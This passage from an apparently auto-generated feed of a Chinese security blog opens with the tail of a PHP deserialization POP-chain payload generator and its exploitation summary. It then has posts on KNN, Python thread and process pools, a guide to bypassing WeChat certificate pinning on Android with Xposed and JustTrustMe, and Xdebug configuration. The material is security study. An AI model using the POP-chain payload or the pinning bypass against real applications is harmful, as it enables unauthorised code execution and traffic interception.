class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> $zhaibaba;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1= <span class="keyword">new</span> GetFlag();<span class="comment">//把 $str1赋值为GetFlag类对</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;zhaibaba = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $zhaibaba;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$payload = <span class="keyword">new</span> start_gg();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($payload));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>总结一下PHP反序列化的挖掘思路，首先进行反序列化的数据点是用户可控的，然后反序列化类中需要有魔术方法，魔术方法中存在敏感操作，或者魔术方法中无敏感操作，但是其对象调用了其他类中的同名函数，可以通过构造POP链利用。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>KNN算法</title>
      <link href="/2020/01/02/KNN%E7%AE%97%E6%B3%95/"/>
      <url>/2020/01/02/KNN%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>1、KNN算法概述</p><p>  kNN算法的核心思想是如果一个样本在特征空间中的k个最相邻的样本中的大多数属于某一个类别，则该样本也属于这个类别，并具有这个类别上样本的特性。该方法在确定分类决策上只依据最邻近的一个或者几个样本的类别来决定待分样本所属的类别。 </p><p>2、KNN算法介绍</p><p> 　　最简单最初级的分类器是将全部的训练数据所对应的类别都记录下来，当测试对象的属性和某个训练对象的属性完全匹配时，便可以对其进行分类。但是怎么可能所有测试对象都会找到与之完全匹配的训练对象呢，其次就是存在一个测试对象同时与多个训练对象匹配，导致一个训练对象被分到了多个类的问题，基于这些问题呢，就产生了KNN。</p><p>   KNN是通过测量不同特征值之间的距离进行分类。它的的思路是：如果一个样本在特征空间中的k个最相似(即特征空间中最邻近)的样本中的大多数属于某一个类别，则该样本也属于这个类别。K通常是不大于20的整数。KNN算法中，所选择的邻居都是已经正确分类的对象。该方法在定类决策上只依据最邻近的一个或者几个样本的类别来决定待分样本所属的类别。</p><p><img src="https://img-blog.csdnimg.cn/20200102145718237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200102145844225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 人工智能机器学习与安全研究部 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>进程池，线程池使用</title>
      <link href="/2019/12/31/%E8%BF%9B%E7%A8%8B%E6%B1%A0%EF%BC%8C%E7%BA%BF%E7%A8%8B%E6%B1%A0%E4%BD%BF%E7%94%A8/"/>
      <url>/2019/12/31/%E8%BF%9B%E7%A8%8B%E6%B1%A0%EF%BC%8C%E7%BA%BF%E7%A8%8B%E6%B1%A0%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="进程的概念"><a href="#进程的概念" class="headerlink" title="进程的概念"></a><strong>进程的概念</strong></h2><p>第一，进程是一个实体。每一个进程都有它自己的地址空间，一般情况下，包括文本区域（text region）、数据区域（data region）和堆栈（stack region）。文本区域存储处理器执行的代码；数据区域存储变量和进程执行期间使用的动态分配的内存；堆栈区域存储着活动过程调用的指令和本地变量。<br>第二，进程是一个“执行中的程序”。程序是一个没有生命的实体，只有处理器赋予程序生命时（操作系统执行之），它才能成为一个活动的实体，我们称其为进程。[3]<br>进程是操作系统中最基本、重要的概念。是多道程序系统出现后，为了刻画系统内部出现的动态情况，描述系统内部各道程序的活动规律引进的一个概念,所有多道程序设计操作系统都建立在进程的基础上。</p><h2 id="引入进程原因"><a href="#引入进程原因" class="headerlink" title="引入进程原因"></a>引入进程原因</h2><ol><li>为了提高资源利用率和系统处理能力，现阶段计算机系统都是多道程序系统，即多道程序并发执行。</li><li>优化系统资源，方便计算机调度，避免系统运算紊乱。</li></ol><h2 id="进程的并行与并发"><a href="#进程的并行与并发" class="headerlink" title="进程的并行与并发"></a>进程的并行与并发</h2><p><strong>并行</strong>：并行是指两者同时执行，比如赛跑，两个人都在不停的往前跑；（资源够用，比如三个线程，四核CPU）</p><p><strong>并发</strong>：并行是指资源有限的情况下，两者交替轮流使用资源，比如一段路（单核CPU资源）同时只能过一个人，A走一段后，让给B，B用完继续给A，交替使用，目的是提高效率。</p><p>并行简图</p><p><img src="https://img-blog.csdnimg.cn/20191231104624807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>并发（线程）<br><img src="https://img-blog.csdnimg.cn/20191231104643694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="二、进程线程"><a href="#二、进程线程" class="headerlink" title="二、进程线程"></a>二、进程线程</h2><p>1、进程<br>程序仅仅只是一堆代码而已，而进程指的是程序的运行过程。需要强调的是：同一个程序执行两次，那也是两个进程。<br>进程：资源管理单位（容器）。<br>线程：最小执行单位，管理线程的是进程。</p><p>进程就是一个程序在一个数据集上的一次动态执行过程。进程一般由程序、数据集、进程控制块三部分组成。我们编写的程序用来描述进程要完成哪些功能以及如何完成；数据集则是程序在执行过程中所需要使用的资源；进程控制块用来记录进程的外部特征，描述进程的执行变化过程，系统可以利用它来控制和管理进程，它是系统感知进程存在的唯一标志。</p><p>2、线程<br>线程的出现是为了降低上下文切换的消耗，提高系统的并发性，并突破一个进程只能干一样事的缺陷，使到进程内并发成为可能。<br>线程也叫轻量级进程，它是一个基本的CPU执行单元，也是程序执行过程中的最小单元，由线程ID、程序计数器、寄存器集合和堆栈共同组成。线程的引入减小了程序并发执行时的开销，提高了操作系统的并发性能。线程没有自己的系统资源。</p><p>3、线程与进程关系<br>在传统操作系统中，每个进程有一个地址空间，而且默认就有一个控制线程。<br>多线程（即多个控制线程）的概念是，在一个进程中存在多个控制线程，控制该进程的地址空间。<br>进程只是用来把资源集中到一起（进程只是一个资源单位，或者说资源集合），而线程才是cpu上的执行单位。</p><p>进程和线程的关系：<br>(1)一个线程只能属于一个进程，而一个进程可以有多个线程，但至少有一个线程。<br>(2)资源分配给进程，同一进程的所有线程共享该进程的所有资源。<br>(3)CPU分给线程，即真正在CPU上运行的是线程。</p><p><strong>一、为什么要引入线程池</strong><br>Python中已经有了threading模块，为什么还需要线程池呢 ？<br>当写爬虫时，需要控制同时爬取的线程数，如果创建了20个线程，而同时只允许3个线程在运行，但是20个线程都需要创建和销毁，线程的创建是需要消耗系统资源的，有没有更好的方案呢？<br>其实只需要三个线程就行了，每个线程各分配一个任务，剩下的任务排队等待，当某个线程完成了任务的时候，排队任务就可以安排给这个线程继续执行。</p><h2 id="线程池使用方法"><a href="#线程池使用方法" class="headerlink" title="线程池使用方法"></a>线程池使用方法</h2><p>pip install threadpool   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pool = ThreadPool(poolsize)  </span><br><span class="line">requests = makeRequests(some_callable, list_of_args, callback)  </span><br><span class="line">[pool.putRequest(req) <span class="keyword">for</span> req in requests]  </span><br><span class="line">pool.wait()</span><br></pre></td></tr></table></figure><p>第一行定义了一个线程池，表示最多可以创建poolsize这么多线程；</p><p>第二行是调用makeRequests创建了要开启多线程的函数，以及函数相关参数和回调函数，其中回调函数可以不写，default是无，也就是说makeRequests只需要2个参数就可以运行；</p><p>第三行用法比较奇怪，是将所有要运行多线程的请求扔进线程池，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[pool.putRequest(req) <span class="keyword">for</span> req in requests]等同于</span><br><span class="line"></span><br><span class="line">　　<span class="keyword">for</span> req in requests:  </span><br><span class="line"></span><br><span class="line">　　　　 pool.putRequest(req)</span><br></pre></td></tr></table></figure><p>第四行是等待所有的线程完成工作后退出。</p><ul><li>我的测试样例是 线程池</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(fn)</span>:</span></span><br><span class="line">  <span class="comment">#fn: 函数参数是数据列表的一个元素</span></span><br><span class="line">  time.sleep(<span class="number">2</span>)</span><br><span class="line">  print(<span class="string">"进程ID"</span>,os.getpid())</span><br><span class="line">  print(fn*fn)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">（1）引入threadpool模块</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">（2）定义线程函数   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">（3）创建线程 池threadpool.ThreadPool()   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">（4）创建需要线程池处理的任务即threadpool.makeRequests()   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">（5）将创建的多个任务put到线程池中,threadpool.putRequest   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">（6）等到所有任务处理完毕theadpool.pool()</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">  testFL = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'单进程:'</span>) <span class="comment">#顺序执行(也就是串行执行，单进程)</span></span><br><span class="line">  s = time.time()</span><br><span class="line">  <span class="keyword">for</span> fn <span class="keyword">in</span> testFL:</span><br><span class="line">    run(fn)</span><br><span class="line">  t1 = time.time()</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">"顺序执行时间："</span>, int(t1 - s))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'多个线程并发:'</span>)</span><br><span class="line"></span><br><span class="line">  pool = threadpool.ThreadPool(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">  调用makeRequests创建了要开启多线程的函数</span><br><span class="line">  requests = threadpool.makeRequests(run,testFL)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 将所有要运行多线程的请求扔进线程池</span></span><br><span class="line">  <span class="keyword">for</span> req <span class="keyword">in</span> requests:</span><br><span class="line">      pool.putRequest(req)</span><br><span class="line">  pool.wait() <span class="comment">#等待所有的线程完成工作后退出</span></span><br><span class="line"></span><br><span class="line">  t2 = time.time()</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">"并行执行时间："</span>, int(t2-t1))</span><br></pre></td></tr></table></figure><ul><li>进程池</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(fn)</span>:</span></span><br><span class="line">  <span class="comment">#fn: 函数参数是数据列表的一个元素</span></span><br><span class="line">  time.sleep(<span class="number">2</span>)</span><br><span class="line">  print(<span class="string">"进程ID"</span>,os.getpid())</span><br><span class="line">  print(fn*fn)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">  testFL = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'单进程:'</span>) <span class="comment">#顺序执行(也就是串行执行，单进程)</span></span><br><span class="line">  s = time.time()</span><br><span class="line">  <span class="keyword">for</span> fn <span class="keyword">in</span> testFL:</span><br><span class="line">    run(fn)</span><br><span class="line">  t1 = time.time()</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">"顺序执行时间："</span>, int(t1 - s))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'多个进程，并行执行:'</span>) <span class="comment">#创建多个进程，并行执行</span></span><br><span class="line">  pool = Pool(<span class="number">3</span>)  <span class="comment">#创建拥有10个进程数量的进程池</span></span><br><span class="line">  <span class="comment">#testFL:要处理的数据列表，run：处理testFL列表中数据的函数</span></span><br><span class="line">  pool.map(run, testFL)</span><br><span class="line"></span><br><span class="line">  pool.close()<span class="comment">#关闭进程池，不再接受新的进程</span></span><br><span class="line">  pool.join()<span class="comment">#主进程阻塞等待子进程的退出</span></span><br><span class="line">  t2 = time.time()</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">"并行执行时间："</span>, int(t2-t1))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>抓安卓微信小程序包抓取不到数据包的解决方法</title>
      <link href="/2019/12/30/%E6%8A%93%E5%AE%89%E5%8D%93%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8C%85%E6%8A%93%E5%8F%96%E4%B8%8D%E5%88%B0%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2019/12/30/%E6%8A%93%E5%AE%89%E5%8D%93%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8C%85%E6%8A%93%E5%8F%96%E4%B8%8D%E5%88%B0%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="项目需要测试小程序，但无法抓取数据包，尝试过多种方法，都失败了，怎么办呢？"><a href="#项目需要测试小程序，但无法抓取数据包，尝试过多种方法，都失败了，怎么办呢？" class="headerlink" title="项目需要测试小程序，但无法抓取数据包，尝试过多种方法，都失败了，怎么办呢？"></a>项目需要测试小程序，但无法抓取数据包，尝试过多种方法，都失败了，怎么办呢？</h2><p><strong>看到一个大佬分享的文章内容：</strong><br><strong>安卓系统 7.0 以下版本，不管微信任意版本，都会信任系统提供的证书<br>安卓系统 7.0 以上版本，微信 7.0 以下版本，微信会信任系统提供的证书<br>安卓系统 7.0 以上版本，微信 7.0 以上版本，微信只信任它自己配置的证书列表</strong></p><p>以上为大前提，我寻找了一个认为比较简单的方法：<br>准备工具：<br>①　XposedInstaller_3.1.5.apk<br>②　weixin673android1360.apk（要低于7版本）<br>③　JustTrustMe1.apk<br>④　BurpsuiteV2.0<br>⑤　夜神最新版（使用的是安卓5）</p><p><a href="https://pan.baidu.com/s/1qhivzmRiAmWJnf7Z-VMjhQ（123工具已分享）" target="_blank" rel="noopener">https://pan.baidu.com/s/1qhivzmRiAmWJnf7Z-VMjhQ（123工具已分享）</a></p><ol><li>这种方法的好处是不用额外买真机测试，直接在模拟器上进行操作即可，于是乎就可以愉快玩耍了。</li></ol><p><img src="https://img-blog.csdnimg.cn/2019123013163849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="2"><li>小白需要注意： 先自行安装xposed的框架，安装完毕需要重启</li></ol><p><img src="https://img-blog.csdnimg.cn/20191230131713223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="3"><li>JustTrustMe模块需要勾选</li></ol><p><img src="https://img-blog.csdnimg.cn/20191230131739792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.最后挂上代理到burp</p><p>搬运大佬的知识学习 天之胶纸的</p>]]></content>
      
      
      <categories>
          
          <category> app渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>phpStorm配置xdebug</title>
      <link href="/2019/12/20/phpStorm%E9%85%8D%E7%BD%AExdebug/"/>
      <url>/2019/12/20/phpStorm%E9%85%8D%E7%BD%AExdebug/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>运行环境：<br>PHPSTORM版本 : 2019.3 汉化<br>PHP版本 : php-7.0.12-nts<br>xdebug版本：php_xdebug-2.6.0beta1-7.0-vc14-nts<br>ps : php版本和xdebug版本一定要相对应<br>xdebug下载地址：<a href="http://xdebug.org/download.php" target="_blank" rel="noopener">http://xdebug.org/download.php</a></p><h2 id="1-环境下的php-ini中添加关于xdebug的配置信息"><a href="#1-环境下的php-ini中添加关于xdebug的配置信息" class="headerlink" title="1.环境下的php.ini中添加关于xdebug的配置信息"></a>1.环境下的php.ini中添加关于xdebug的配置信息</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">zend_extension=<span class="string">"D:\phpStudy\php\php-5.6.27-nts\ext\php_xdebug.dll"</span></span><br><span class="line">xdebug.remote_enable=On</span><br><span class="line">xdebug.remote_handler=dbgp</span><br><span class="line">xdebug.remote_host=localhost</span><br><span class="line">xdebug.remote_port=<span class="number">9000</span></span><br><span class="line">xdebug.idekey=PHPSTORM</span><br></pre></td></tr></table></figure><h2 id="2-重启查看phpinfo-会显示有关xdebug的信息"><a href="#2-重启查看phpinfo-会显示有关xdebug的信息" class="headerlink" title="2.重启查看phpinfo()会显示有关xdebug的信息"></a>2.重启查看phpinfo()会显示有关xdebug的信息</h2><h2 id="3-开始配置phpStorm"><a href="#3-开始配置phpStorm" class="headerlink" title="3.开始配置phpStorm"></a>3.开始配置phpStorm</h2><p>1.客户端调试，打开phpStorm，进入File&gt;Settings&gt;PHP&gt;Servers，这里要填写服务器端的相关信息，name填localhost，host填localhost，port填80，debugger选[XDebug]<br><img src="https://img-blog.csdnimg.cn/20191220143254447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2.进入File&gt;Settings&gt;PHP&gt;Debug，看到XDebug选项卡，port填9000，其他默认<br>端口和php.ini的配置要一致<br><img src="https://img-blog.csdnimg.cn/20191220143206796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.进入File&gt;Settings&gt;PHP&gt;Debug&gt;DBGp Proxy，IDE key 填 phpStorm，host 填localhost，port 填80</p><p><img src="https://img-blog.csdnimg.cn/20191220143141931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>此时phpstorm上面的调试运行按钮是灰色的</p><p><img src="https://img-blog.csdnimg.cn/20191220143344720.png" alt="在这里插入图片描述"></p><p>点击+号增加服务<br><img src="https://img-blog.csdnimg.cn/20191220143408198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>先配置server</p><p><img src="https://img-blog.csdnimg.cn/20191220143331730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>打上断点，此时调试运行按钮已经变绿 点击调试按钮即可开始进行调试<br><img src="https://img-blog.csdnimg.cn/20191220143455269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 配环境 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>phpStudy开启XDebug无效打不开坑点</title>
      <link href="/2019/12/20/phpStudy%E5%BC%80%E5%90%AFXDebug%E6%97%A0%E6%95%88%E6%89%93%E4%B8%8D%E5%BC%80%E5%9D%91%E7%82%B9/"/>
      <url>/2019/12/20/phpStudy%E5%BC%80%E5%90%AFXDebug%E6%97%A0%E6%95%88%E6%89%93%E4%B8%8D%E5%BC%80%E5%9D%91%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="1-造成开启XDebug无效原因"><a href="#1-造成开启XDebug无效原因" class="headerlink" title="1. 造成开启XDebug无效原因"></a>1. 造成开启XDebug无效原因</h2><p> <strong>1. 路径不正确</strong><br>在php.ini文件中zend_extension路径不正确，例如：正反斜杠、路径不对问题</p><p> <strong>2. php_debug扩展版本不匹配</strong></p><p><strong>php_debug扩展32位或者64位与安装PHP的不对应</strong><br>PHP7.2版本，实际下载的php_debug版本是PHP7.1，就会造成开启debug失败<br> <strong>注意下载的php_debug扩展NTS/TS 与安装PHP对应</strong><br>一般的集成环境中，<code>**PHP的架构都是**32位的（x86）****，</code>而你的电脑是64位（x64），<code>以PHP的环境架构为准</code>，例如：我的使用的PHP是x32为，电脑是win10 64位，我直接到xdebug官网下载64位扩展，导致开启扩展失败<br><strong>3. 配置文件写的不全</strong><br>下面给出</p><h2 id="2-具体开启XDebug流程"><a href="#2-具体开启XDebug流程" class="headerlink" title="2. 具体开启XDebug流程"></a>2. 具体开启XDebug流程</h2><p><strong><em>版本一定要一致</em></strong><br><strong>1、使用phpinfo函数查看PHP版本信息需要注意的如下：</strong></p><p><img src="https://img-blog.csdnimg.cn/20191220140707338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>2、按照上图红框内的信息到<code>https://xdebug.org/download.php</code>下载对应的xdebug扩展</strong><br>需要注意的地方是xdebug官网中<br>没有带（TS）为非线性安全版本（NTS）<br>没有带（TS）为非线性安全版本（NTS）<br>没有带（TS）为非线性安全版本（NTS）<br><img src="https://img-blog.csdnimg.cn/20191220141048558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>3、在php.ini文件中添加如下信息：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">zend_extension=<span class="string">"D:\phpStudy\PHPTutorial\php\php-7.2.1-nts\ext\此处为刚刚下载好的路径"</span></span><br><span class="line">;是否允许Xdebug跟踪函数调用，跟踪信息以文件形式存储，默认值为<span class="number">0</span></span><br><span class="line">xdebug.auto_trace=<span class="number">1</span></span><br><span class="line">;是否允许Xdebug跟踪函数参数，默认值为<span class="number">0</span></span><br><span class="line">xdebug.collect_params=<span class="number">1</span></span><br><span class="line">;是否允许Xdebug跟踪函数返回值，默认值为<span class="number">0</span></span><br><span class="line">xdebug.collect_return=<span class="number">1</span></span><br><span class="line">;函数调用跟踪信息输出文件目录，默认值为/tmp</span><br><span class="line">xdebug.trace_output_dir =<span class="string">"F:\PHP_xdebug"</span></span><br><span class="line">;性能分析文件的存放位置，默认值为/tmp</span><br><span class="line">xdebug.profiler_output_dir =<span class="string">"F:\PHP_xdebug"</span></span><br><span class="line">;打开xdebug的性能分析器，以文件形式存储，这项配置是不能以ini_set()函数配置的，默认值为<span class="number">0</span></span><br><span class="line">xdebug.profiler_enable = <span class="number">1</span></span><br><span class="line">;性能分析文件的命名规则，默认值为cachegrind.out.%p</span><br><span class="line">xdebug.profiler_output_name = <span class="string">"cachegrind.out.%t.%p"</span></span><br><span class="line">xdebug.remote_enable = <span class="number">1</span></span><br><span class="line">;用于zend studio远程调试的应用层通信协议</span><br><span class="line">xdebug.remote_handler = <span class="string">"dbgp"</span></span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line">xdebug.remote_host = <span 